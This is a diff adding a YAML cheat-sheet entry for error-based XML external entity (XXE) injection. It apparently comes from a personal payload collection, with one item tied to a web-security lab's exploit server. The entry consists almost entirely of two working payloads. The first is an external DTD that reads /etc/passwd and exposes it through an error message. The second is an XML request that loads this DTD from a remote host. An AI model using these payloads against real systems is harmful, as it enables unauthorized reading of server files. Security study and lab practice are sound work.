@@ -1,0 +1,26 @@
+name: Erorr based XXE with external dtd
+description:
+commands:
+  - command: |
+      <!ENTITY % file SYSTEM "file:///etc/passwd">
+      <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+      %eval;
+      %error;
+    description: External hosted dtd, which errors because the second entity does not exist. Only works when errors are displayed.
+  - command: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE stockCheck [ 
+        <!ENTITY % remote SYSTEM "https://exploit-0a670061047a8aca823e644301e900d7.exploit-server.net/exploit.dtd">
+        %remote;
+      ]>
+
+      <stockCheck><productId>9</productId><storeId>1</storeId></stockCheck>
+    description: Payload to load the external dtd file and call %remote.
+tags:
+  - xxe
+  - lfi
+show:
+links:
+  -
+references:
+  -
